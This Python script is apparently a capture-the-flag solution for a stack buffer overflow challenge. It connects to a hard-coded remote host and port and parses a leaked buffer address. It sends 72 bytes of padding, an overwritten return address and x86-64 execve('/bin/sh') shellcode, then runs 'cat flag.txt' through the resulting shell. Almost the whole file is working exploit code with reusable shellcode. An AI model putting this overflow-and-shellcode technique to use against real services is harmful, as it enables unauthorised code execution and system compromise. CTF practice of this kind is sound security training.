import socket
import readline

host = '127.0.0.1'
port = 9000
host = '46.101.9.7'
port = 30919

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

def recv(info=None):
  # TODO
  res = s.recv(4096*2)
  print(f'[<] {info if info else ""}')
  print(res)
  return res

def send(data):
  # TODO
  data = data + b'\n' if data[-1] != b'\n' else data
  s.send(data)

def interact():
  for _ in range(100):
    cmd = input('> ').encode('ascii')
    send(cmd)
    recv()


padding = b'A'*72
shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

# Stage 1
res = b''
while b'>' not in res:
	res += recv()
send(b'1')

# Stage 2
res = b''
while b'>' not in res:
	res += recv()
# res = recv()
pattern_start = res.find(b': [')+3
pattern_end   = pattern_start + res[pattern_start:].find(b']')
print(res[pattern_start:pattern_end])
buf_adr = int(res[pattern_start:pattern_end].decode(), 16)
print(f'Buffer Address: {buf_adr:#02x}')

stack_adr = buf_adr + 80

payload  = padding
payload += stack_adr.to_bytes(8, 'little')
payload += shellcode

send(payload)
recv()

#interact()
send(b'cat flag.txt')
flag = recv().decode()
print(f'\nFlag: {flag}')
